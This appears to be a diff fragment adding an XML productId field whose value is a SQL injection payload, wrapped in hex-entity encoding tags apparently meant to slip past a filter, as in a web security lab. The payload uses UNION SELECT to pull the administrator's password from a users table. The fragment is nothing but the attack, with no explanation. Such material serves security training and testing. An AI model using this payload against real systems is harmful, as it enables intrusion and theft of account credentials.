@@ -1,0 +1,5 @@
+<productId>
+<@hex_entities>
+1 UNION (SELECT password FROM users WHERE username = 'administrator') --
+<@/hex_entities>
+</productId>
